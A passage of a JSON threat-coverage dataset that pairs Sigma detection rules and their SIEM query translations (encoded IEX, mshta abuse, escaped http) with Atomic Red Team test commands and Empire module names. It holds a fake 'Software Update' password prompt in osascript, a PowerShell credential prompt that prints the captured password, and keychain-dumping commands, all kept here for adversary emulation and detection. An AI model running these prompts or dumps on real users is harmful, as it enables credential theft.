unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*OjpGcm9tQmFzZTY0U3RyaW5n* OR *o6RnJvbUJhc2U2NFN0cmluZ* OR *6OkZyb21CYXNlNjRTdHJpbm*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Encoded-FromBase64String <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Encoded FromBase64String\",\\n    \"description\": \"Detects a base64 encoded FromBase64String keyword in a process command line\",\\n    \"tags\": [\\n      \"attack.t1086\",\\n      \"attack.t1140\",\\n      \"attack.execution\",\\n      \"attack.defense_evasion\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*OjpGcm9tQmFzZTY0U3RyaW5n* OR *o6RnJvbUJhc2U2NFN0cmluZ* OR *6OkZyb21CYXNlNjRTdHJpbm*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*OjpGcm9tQmFzZTY0U3RyaW5n* OR *o6RnJvbUJhc2U2NFN0cmluZ* OR *6OkZyb21CYXNlNjRTdHJpbm*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Encoded FromBase64String\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*OjpGcm9tQmFzZTY0U3RyaW5n* *o6RnJvbUJhc2U2NFN0cmluZ* *6OkZyb21CYXNlNjRTdHJpbm*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*OjpGcm9tQmFzZTY0U3RyaW5n*\" OR CommandLine=\"*o6RnJvbUJhc2U2NFN0cmluZ*\" OR CommandLine=\"*6OkZyb21CYXNlNjRTdHJpbm*\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*OjpGcm9tQmFzZTY0U3RyaW5n*\", \"*o6RnJvbUJhc2U2NFN0cmluZ*\", \"*6OkZyb21CYXNlNjRTdHJpbm*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*OjpGcm9tQmFzZTY0U3RyaW5n.*|.*.*o6RnJvbUJhc2U2NFN0cmluZ.*|.*.*6OkZyb21CYXNlNjRTdHJpbm.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Encoded IEX\nid: 88f680b8-070e-402c-ae11-d2914f2257f1\nstatus: experimental\ndescription: Detects a base64 encoded IEX command string in a process command line\nauthor: Florian Roth\ndate: 2019/08/23\ntags:\n    - attack.t1086\n    - attack.t1140\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|base64offset|contains: \n          - 'IEX (['\n          - 'iex (['\n          - 'iex (New'\n          - 'IEX (New'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Encoded IEX\nid: 88f680b8-070e-402c-ae11-d2914f2257f1\nstatus: experimental\ndescription: Detects a base64 encoded IEX command string in a process command line\nauthor: Florian Roth\ndate: 2019/08/23\ntags:\n    - attack.t1086\n    - attack.t1140\n    - attack.execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|base64offset|contains: \n          - 'IEX (['\n          - 'iex (['\n          - 'iex (New'\n          - 'IEX (New'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*SUVYIChb* OR *lFWCAoW* OR *JRVggKF* OR *aWV4IChb* OR *lleCAoW* OR *pZXggKF* OR *aWV4IChOZX* OR *lleCAoTmV3* OR *pZXggKE5ld* OR *SUVYIChOZX* OR *lFWCAoTmV3* OR *JRVggKE5ld*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Encoded-IEX <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Encoded IEX\",\\n    \"description\": \"Detects a base64 encoded IEX command string in a process command line\",\\n    \"tags\": [\\n      \"attack.t1086\",\\n      \"attack.t1140\",\\n      \"attack.execution\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*SUVYIChb* OR *lFWCAoW* OR *JRVggKF* OR *aWV4IChb* OR *lleCAoW* OR *pZXggKF* OR *aWV4IChOZX* OR *lleCAoTmV3* OR *pZXggKE5ld* OR *SUVYIChOZX* OR *lFWCAoTmV3* OR *JRVggKE5ld*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*SUVYIChb* OR *lFWCAoW* OR *JRVggKF* OR *aWV4IChb* OR *lleCAoW* OR *pZXggKF* OR *aWV4IChOZX* OR *lleCAoTmV3* OR *pZXggKE5ld* OR *SUVYIChOZX* OR *lFWCAoTmV3* OR *JRVggKE5ld*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Encoded IEX\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*SUVYIChb* *lFWCAoW* *JRVggKF* *aWV4IChb* *lleCAoW* *pZXggKF* *aWV4IChOZX* *lleCAoTmV3* *pZXggKE5ld* *SUVYIChOZX* *lFWCAoTmV3* *JRVggKE5ld*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*SUVYIChb*\" OR CommandLine=\"*lFWCAoW*\" OR CommandLine=\"*JRVggKF*\" OR CommandLine=\"*aWV4IChb*\" OR CommandLine=\"*lleCAoW*\" OR CommandLine=\"*pZXggKF*\" OR CommandLine=\"*aWV4IChOZX*\" OR CommandLine=\"*lleCAoTmV3*\" OR CommandLine=\"*pZXggKE5ld*\" OR CommandLine=\"*SUVYIChOZX*\" OR CommandLine=\"*lFWCAoTmV3*\" OR CommandLine=\"*JRVggKE5ld*\") | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*SUVYIChb*\", \"*lFWCAoW*\", \"*JRVggKF*\", \"*aWV4IChb*\", \"*lleCAoW*\", \"*pZXggKF*\", \"*aWV4IChOZX*\", \"*lleCAoTmV3*\", \"*pZXggKE5ld*\", \"*SUVYIChOZX*\", \"*lFWCAoTmV3*\", \"*JRVggKE5ld*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*SUVYIChb.*|.*.*lFWCAoW.*|.*.*JRVggKF.*|.*.*aWV4IChb.*|.*.*lleCAoW.*|.*.*pZXggKF.*|.*.*aWV4IChOZX.*|.*.*lleCAoTmV3.*|.*.*pZXggKE5ld.*|.*.*SUVYIChOZX.*|.*.*lFWCAoTmV3.*|.*.*JRVggKE5ld.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Commandline Escape\nid: f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd\ndescription: Detects suspicious process that use escape characters\nstatus: experimental\nreferences:\n    - https://twitter.com/vysecurity/status/885545634958385153\n    - https://twitter.com/Hexacorn/status/885553465417756673\n    - https://twitter.com/Hexacorn/status/885570278637678592\n    - https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html\n    - http://www.windowsinspired.com/understanding-the-command-line-string-and-arguments-received-by-a-windows-program/\nauthor: juju4\nmodified: 2018/12/11\ntags:\n    - attack.defense_evasion\n    - attack.t1140\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            # - <TAB>   # no TAB modifier in sigmac yet, so this matches <TAB> (or TAB in elasticsearch backends without DSL queries)\n            - ^h^t^t^p\n            - h\"t\"t\"p\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Commandline Escape\nid: f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd\ndescription: Detects suspicious process that use escape characters\nstatus: experimental\nreferences:\n    - https://twitter.com/vysecurity/status/885545634958385153\n    - https://twitter.com/Hexacorn/status/885553465417756673\n    - https://twitter.com/Hexacorn/status/885570278637678592\n    - https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html\n    - http://www.windowsinspired.com/understanding-the-command-line-string-and-arguments-received-by-a-windows-program/\nauthor: juju4\nmodified: 2018/12/11\ntags:\n    - attack.defense_evasion\n    - attack.t1140\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            # - <TAB>   # no TAB modifier in sigmac yet, so this matches <TAB> (or TAB in elasticsearch backends without DSL queries)\n            - ^h^t^t^p\n            - h\"t\"t\"p\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine:(\"\\\\^h\\\\^t\\\\^t\\\\^p\" OR \"h\\\\\"t\\\\\"t\\\\\"p\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Commandline-Escape <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Commandline Escape\",\\n    \"description\": \"Detects suspicious process that use escape characters\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1140\"\\n    ],\\n    \"query\": \"CommandLine:(\\\\\"\\\\\\\\^h\\\\\\\\^t\\\\\\\\^t\\\\\\\\^p\\\\\" OR \\\\\"h\\\\\\\\\\\\\"t\\\\\\\\\\\\\"t\\\\\\\\\\\\\"p\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine:(\\\\\"\\\\\\\\^h\\\\\\\\^t\\\\\\\\^t\\\\\\\\^p\\\\\" OR \\\\\"h\\\\\\\\\\\\\"t\\\\\\\\\\\\\"t\\\\\\\\\\\\\"p\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Commandline Escape\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine:(\"\\\\^h\\\\^t\\\\^t\\\\^p\" \"h\\\\\"t\\\\\"t\\\\\"p\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"^h^t^t^p\" OR CommandLine=\"h\\\\\"t\\\\\"t\\\\\"p\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"^h^t^t^p\", \"h\\\\\"t\\\\\"t\\\\\"p\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P \\'^(?:.*\\\\^h\\\\^t\\\\^t\\\\^p|.*h\"t\"t\"p)\\'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: MSHTA Suspicious Execution 01\nid: cc7abbd0-762b-41e3-8a26-57ad50d2eea3\nstatus: experimental\ndescription: Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism\ndate: 22/02/2019\nmodified: 22/02/2019\nauthor: Diego Perez (@darkquassar)\nreferences:\n    - http://blog.sevagas.com/?Hacking-around-HTA-files\n    - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356\n    - https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script\n    - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997\ntags:\n    - attack.defense_evasion\n    - attack.t1140\nlogsource:\n    category: process_creation\n    product: windows\nfalsepositives: \n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high\ndetection:\n    selection1:\n        CommandLine: \n            - '*mshta vbscript:CreateObject(\"Wscript.Shell\")*'\n            - '*mshta vbscript:Execute(\"Execute*'\n            - '*mshta vbscript:CreateObject(\"Wscript.Shell\").Run(\"mshta.exe*'\n    selection2:\n        Image:\n            - 'C:\\Windows\\system32\\mshta.exe'\n        CommandLine: \n            - '*.jpg*'\n            - '*.png*'\n            - '*.lnk*'\n            # - '*.chm*'  # could be prone to false positives\n            - '*.xls*'\n            - '*.doc*'\n            - '*.zip*'\n    condition:\n        selection1 or selection2", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: MSHTA Suspicious Execution 01\nid: cc7abbd0-762b-41e3-8a26-57ad50d2eea3\nstatus: experimental\ndescription: Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism\ndate: 22/02/2019\nmodified: 22/02/2019\nauthor: Diego Perez (@darkquassar)\nreferences:\n    - http://blog.sevagas.com/?Hacking-around-HTA-files\n    - https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356\n    - https://docs.microsoft.com/en-us/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script\n    - https://medium.com/tsscyber/pentesting-and-hta-bypassing-powershell-constrained-language-mode-53a42856c997\ntags:\n    - attack.defense_evasion\n    - attack.t1140\nlogsource:\n    category: process_creation\n    product: windows\nfalsepositives: \n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: high\ndetection:\n    selection1:\n        CommandLine: \n            - '*mshta vbscript:CreateObject(\"Wscript.Shell\")*'\n            - '*mshta vbscript:Execute(\"Execute*'\n            - '*mshta vbscript:CreateObject(\"Wscript.Shell\").Run(\"mshta.exe*'\n    selection2:\n        Image:\n            - 'C:\\Windows\\system32\\mshta.exe'\n        CommandLine: \n            - '*.jpg*'\n            - '*.png*'\n            - '*.lnk*'\n            # - '*.chm*'  # could be prone to false positives\n            - '*.xls*'\n            - '*.doc*'\n            - '*.zip*'\n    condition:\n        selection1 or selection2", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:(*mshta\\\\ vbscript\\\\:CreateObject\\\\(\\\\\"Wscript.Shell\\\\\"\\\\)* OR *mshta\\\\ vbscript\\\\:Execute\\\\(\\\\\"Execute* OR *mshta\\\\ vbscript\\\\:CreateObject\\\\(\\\\\"Wscript.Shell\\\\\"\\\\).Run\\\\(\\\\\"mshta.exe*) OR (Image:(\"C\\\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\mshta.exe\") AND CommandLine.keyword:(*.jpg* OR *.png* OR *.lnk* OR *.xls* OR *.doc* OR *.zip*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/MSHTA-Suspicious-Execution-01 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"MSHTA Suspicious Execution 01\",\\n    \"description\": \"Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1140\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:(*mshta\\\\\\\\ vbscript\\\\\\\\:CreateObject\\\\\\\\(\\\\\\\\\\\\\"Wscript.Shell\\\\\\\\\\\\\"\\\\\\\\)* OR *mshta\\\\\\\\ vbscript\\\\\\\\:Execute\\\\\\\\(\\\\\\\\\\\\\"Execute* OR *mshta\\\\\\\\ vbscript\\\\\\\\:CreateObject\\\\\\\\(\\\\\\\\\\\\\"Wscript.Shell\\\\\\\\\\\\\"\\\\\\\\).Run\\\\\\\\(\\\\\\\\\\\\\"mshta.exe*) OR (Image:(\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\mshta.exe\\\\\") AND CommandLine.keyword:(*.jpg* OR *.png* OR *.lnk* OR *.xls* OR *.doc* OR *.zip*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:(*mshta\\\\\\\\ vbscript\\\\\\\\:CreateObject\\\\\\\\(\\\\\\\\\\\\\"Wscript.Shell\\\\\\\\\\\\\"\\\\\\\\)* OR *mshta\\\\\\\\ vbscript\\\\\\\\:Execute\\\\\\\\(\\\\\\\\\\\\\"Execute* OR *mshta\\\\\\\\ vbscript\\\\\\\\:CreateObject\\\\\\\\(\\\\\\\\\\\\\"Wscript.Shell\\\\\\\\\\\\\"\\\\\\\\).Run\\\\\\\\(\\\\\\\\\\\\\"mshta.exe*) OR (Image:(\\\\\"C\\\\\\\\:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\system32\\\\\\\\\\\\\\\\mshta.exe\\\\\") AND CommandLine.keyword:(*.jpg* OR *.png* OR *.lnk* OR *.xls* OR *.doc* OR *.zip*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'MSHTA Suspicious Execution 01\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:(*mshta vbscript\\\\:CreateObject\\\\(\\\\\"Wscript.Shell\\\\\"\\\\)* *mshta vbscript\\\\:Execute\\\\(\\\\\"Execute* *mshta vbscript\\\\:CreateObject\\\\(\\\\\"Wscript.Shell\\\\\"\\\\).Run\\\\(\\\\\"mshta.exe*) OR (Image:(\"C\\\\:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\mshta.exe\") AND CommandLine.keyword:(*.jpg* *.png* *.lnk* *.xls* *.doc* *.zip*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((CommandLine=\"*mshta vbscript:CreateObject(\\\\\"Wscript.Shell\\\\\")*\" OR CommandLine=\"*mshta vbscript:Execute(\\\\\"Execute*\" OR CommandLine=\"*mshta vbscript:CreateObject(\\\\\"Wscript.Shell\\\\\").Run(\\\\\"mshta.exe*\") OR ((Image=\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\mshta.exe\") (CommandLine=\"*.jpg*\" OR CommandLine=\"*.png*\" OR CommandLine=\"*.lnk*\" OR CommandLine=\"*.xls*\" OR CommandLine=\"*.doc*\" OR CommandLine=\"*.zip*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (CommandLine IN [\"*mshta vbscript:CreateObject(\\\\\"Wscript.Shell\\\\\")*\", \"*mshta vbscript:Execute(\\\\\"Execute*\", \"*mshta vbscript:CreateObject(\\\\\"Wscript.Shell\\\\\").Run(\\\\\"mshta.exe*\"] OR (Image IN [\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\mshta.exe\"] CommandLine IN [\"*.jpg*\", \"*.png*\", \"*.lnk*\", \"*.xls*\", \"*.doc*\", \"*.zip*\"])))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P \\'^(?:.*(?:.*(?:.*.*mshta vbscript:CreateObject\\\\(\"Wscript\\\\.Shell\"\\\\).*|.*.*mshta vbscript:Execute\\\\(\"Execute.*|.*.*mshta vbscript:CreateObject\\\\(\"Wscript\\\\.Shell\"\\\\)\\\\.Run\\\\(\"mshta\\\\.exe.*)|.*(?:.*(?=.*(?:.*C:\\\\Windows\\\\system32\\\\mshta\\\\.exe))(?=.*(?:.*.*\\\\.jpg.*|.*.*\\\\.png.*|.*.*\\\\.lnk.*|.*.*\\\\.xls.*|.*.*\\\\.doc.*|.*.*\\\\.zip.*)))))\\'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1141/T1141.yaml", "command": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n", "name": null}, {"source": "atomics/T1141/T1141.yaml", "command": "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/prompt", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/prompt", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/prompt", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/prompt", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/screensaver_alleyoop", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/screensaver_alleyoop", "name": "Empire Module Command"}], "command_list": ["osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n", "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password", "powershell/collection/prompt", "powershell/collection/prompt", "python/collection/osx/prompt", "python/collection/osx/prompt", "python/collection/osx/screensaver_alleyoop", "python/collection/osx/screensaver_alleyoop"], "technique_id": "T1141", "parsed_datasets": [{"Atomic Red Team Test - Input Prompt": {"display_name": "Input Prompt", "atomic_tests": [{"description": "Prompt User for Password (Local Phishing)\nReference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n", "supported_platforms": ["macos"], "name": "AppleScript - Prompt User for Password", "executor": {"command": "osascript -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to activate' -e 'tell app \"System Preferences\" to display dialog \"Software Update requires that you type your password to apply changes.\" & return & return  default answer \"\" with icon 1 with hidden answer with title \"Software Update\"'\n", "name": "sh"}}, {"description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n", "supported_platforms": ["windows"], "name": "PowerShell - Prompt User for Password", "executor": {"elevation_required": false, "command": "# Creates GUI to prompt for password. Expect long pause before prompt is available.    \n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password", "name": "powershell"}}], "attack_technique": "T1141"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1141", "Empire Module": "powershell/collection/prompt", "Technique": "Input Prompt", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/prompt\":  [\"T1141\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1141", "Empire Module": "python/collection/osx/prompt", "Technique": "Input Prompt", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/prompt\":  [\"T1141\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1141", "Empire Module": "python/collection/osx/screensaver_alleyoop", "Technique": "Input Prompt", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/collection/osx/screensaver_alleyoop\":  [\"T1141\"],"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1142/T1142.yaml", "command": "security -h\nsecurity find-certificate -a -p > allcerts.pem\nsecurity import /tmp/certs.pem -k\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keychaindump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keychaindump", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keychaindump_chainbreaker", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keychaindump_chainbreaker", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/collection/osx/keychaindump_decrypt", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": 